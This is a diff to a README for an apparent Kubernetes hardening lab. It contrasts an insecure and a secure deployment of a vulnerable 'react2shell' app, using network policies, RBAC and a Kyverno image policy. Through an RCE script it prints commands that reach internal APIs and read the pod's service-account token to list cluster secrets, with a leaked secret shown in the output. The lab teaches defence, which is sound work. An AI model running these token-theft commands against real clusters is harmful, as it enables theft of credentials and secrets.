@@ -7,6 +7,9 @@
   - [Step](#step)
   - [Network Policy](#network-policy)
   - [RBAC](#rbac)
+  - [Kyverno](#kyverno)
+    - [Install with helm](#install-with-helm)
+    - [Argo CD](#argo-cd)
 
 ---
 
@@ -24,8 +27,7 @@
 | --- | --------------------- | -------------------------------------------------------------------- |
 | 1   | Create Network policy | api in prod ns is isolated                                           |
 | 2   | RBAC                  | vulnerable pod cannot access cluster secret and associated resources |
-| 3   | PSS                   | ns insecure label; delete existing pod and no recreated due to pss   |
-| 4   | kyverno imagepolicy   | new deploy with vulnerable image cannot be launched                  |
+| 3   | kyverno imagepolicy   | new deploy with vulnerable image cannot be launched                  |
 
 ---
 
@@ -35,32 +37,30 @@
   - isolate connection between namepsaces
   - the `insecure` pod can no longer curl it.
 
-
-
 ```sh
 # ##############################
-# before: insecure pod can reach prod api
+# insecure: can reach backend api
 # ##############################
-python scripts/rce.py http://localhost:8080 "curl -m 5 http://nginx-api.prod/api/v1/healthz"
+python scripts/rce.py http://localhost:8000 "curl -sS -m 5 http://backend-api.insecure-backend/api/v1/healthz"
 # {"status":"healthy","message":"Service is running"}
 
+python scripts/rce.py http://localhost:8000 "curl -sS -m 5 http://backend-api.insecure-backend/api/v1/users"
+# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
+
 # ##############################
-# apply default-deny + allow-list in prod, then retry -> times out
+# Secure: access fails
 # ##############################
-kubectl get netpol -n prod
+kubectl get netpol -n secure-backend
 # NAME                        POD-SELECTOR    AGE
 # allow-dns-egress            <none>          81s
 # allow-nginx-api-from-prod   app=nginx-api   81s
 # default-deny-all            <none>          81s
 
-kubectl get netpol -n insecure
-# NAME                POD-SELECTOR      AGE
-# allow-app-ingress   app=react2shell   109s
-# allow-dns-egress    <none>            109s
-# default-deny-all    <none>            109s
-
-python scripts/rce.py http://localhost:8080 "curl -S -m 5 http://nginx-api.prod/api/v1/healthz"
+python scripts/rce.py http://localhost:8080 "curl -sS -m 5 http://backend-api.secure-backend/api/v1/healthz"
 # curl: (28) Connection timed out after 5000 milliseconds
+
+python scripts/rce.py http://localhost:8080 "curl -sS -m 5 http://backend-api.secure-backend/api/v1/users"
+# curl: (28) Connection timed out after 5001 milliseconds
 ```
 
 ---
@@ -107,5 +107,81 @@ kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:secu
 - rce
 
 ```sh
+# insecure
 python scripts/rce.py http://localhost:8000 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
+      # "data": {
+      #   "password": "Q29OdEFpbkVyLXNFY1JldC1zRUN1ckU="
+      # },
+      # "type": "Opaque"
+
+# secure: cannot query secrets
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
+# {
+#   "kind": "Status",
+#   "apiVersion": "v1",
+#   "metadata": {},
+#   "status": "Failure",
+#   "message": "secrets is forbidden: User \"system:serviceaccount:secure-frontend:react2shell\" cannot list resource \"secrets\" in API group \"\" at the cluster scope",
+#   "reason": "Forbidden",
+#   "details": {
+#     "kind": "secrets"
+#   },
+#   "code": 403
+# }
+
+# secure: cannot query ns
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
+# {
+#   "kind": "Status",
+#   "apiVersion": "v1",
+#   "metadata": {},
+#   "status": "Failure",
+#   "message": "namespaces is forbidden: User \"system:serviceaccount:secure-frontend:react2shell\" cannot list resource \"namespaces\" in API group \"\" at the cluster scope",
+#   "reason": "Forbidden",
+#   "details": {
+#     "kind": "namespaces"
+#   },
+#   "code": 403
+# }
+
+
+```
+
+## Kyverno
+
+### Install with helm
+
+```sh
+helm repo add kyverno https://kyverno.github.io/kyverno/
+helm repo update
+helm install kyverno kyverno/kyverno -n kyverno --create-namespace
+
+# confirm
+k get po -n kyverno
+# NAME                                             READY   STATUS    RESTARTS   AGE
+# kyverno-admission-controller-86cbbb5545-4str2    1/1     Running   0          2m33s
+# kyverno-background-controller-5546cb5b76-jmll6   1/1     Running   0          2m33s
+# kyverno-cleanup-controller-f947f9769-bvqg6       1/1     Running   0          2m33s
+# kyverno-reports-controller-79d68cccbb-756qf      1/1     Running   0          2m33s
+
+# clean up
+helm uninstall kyverno -n kyverno
+```
+
+---
+
+### Argo CD
+
+- `argocd/platform/kyverno.yaml`: install kyverno
+- `argocd/platform/kyverno-image-policy.yaml`: image policy
+  - must use docker registry
+  - must use tag
+  - must not use latest
+  - must not use vulerable tag
+
+```sh
+# confirm
+kubectl get clusterpolicy image-policy
+
+kubectl -n insecure-frontend run bad --image=docker.io/simonangelfong/react2shell:insecure
 ```
